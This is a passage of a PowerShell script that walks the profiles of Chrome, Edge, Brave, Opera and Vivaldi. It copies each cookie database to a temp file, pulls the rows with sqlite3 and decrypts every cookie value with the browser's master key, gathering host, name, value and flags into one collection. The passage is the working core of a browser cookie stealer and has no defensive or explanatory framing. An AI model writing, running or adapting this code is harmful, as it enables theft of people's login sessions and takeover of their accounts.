    Chrome  = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    Edge    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    Brave   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    Opera   = "$env:APPDATA\Opera Software\Opera Stable"
    Vivaldi = "$env:LOCALAPPDATA\Vivaldi\User Data"
}

$allCookies = [System.Collections.Generic.List[object]]::new()

foreach ($b in $browsers.GetEnumerator()) {
    $bName = $b.Key; $base = $b.Value
    if (-not (Test-Path $base)) { continue }
    $masterKey = Get-ChromiumMasterKey $base
    $profiles  = @('Default') + (Get-ChildItem $base -Directory -Filter 'Profile *' -EA SilentlyContinue |
                    Select-Object -ExpandProperty Name)

    foreach ($prof in $profiles) {
        $dbPath = Join-Path $base "$prof\Network\Cookies"
        if (-not (Test-Path $dbPath)) { $dbPath = Join-Path $base "$prof\Cookies" }
        if (-not (Test-Path $dbPath) -or -not $sqlite3) { continue }

        $tmp = "$env:TEMP\ck_${bName}_${prof}.db"
        Copy-Item $dbPath $tmp -Force -EA SilentlyContinue
        if (-not (Test-Path $tmp)) { continue }

        # Columns: host_key | name | encrypted_value | path | expires_utc | is_secure | is_httponly
        $rows = & $sqlite3 -separator "`t" $tmp `
            "SELECT host_key,name,encrypted_value,path,expires_utc,is_secure,is_httponly FROM cookies;" 2>$null
        Remove-Item $tmp -Force -EA SilentlyContinue

        foreach ($row in $rows) {
            $f = $row -split "`t"
            if ($f.Count -lt 3) { continue }
            $decVal = if ($masterKey) {
                Decrypt-Value ([Text.Encoding]::Latin1.GetBytes($f[2])) $masterKey
            } else { '' }
            if (-not $decVal) { continue }
            $secureVal   = if ($f.Count -gt 5 -and $f[5]) { [int]$f[5] } else { 0 }
            $httponlyVal = if ($f.Count -gt 6 -and $f[6]) { [int]$f[6] } else { 0 }
            $allCookies.Add([pscustomobject]@{
                browser  = $bName
                profile  = $prof
                host     = $f[0]
                name     = $f[1]
                value    = $decVal
                path     = $f[3]
                expires  = $f[4]
                secure   = [bool]$secureVal
                httponly = [bool]$httponlyVal
            })
        }
    }
}

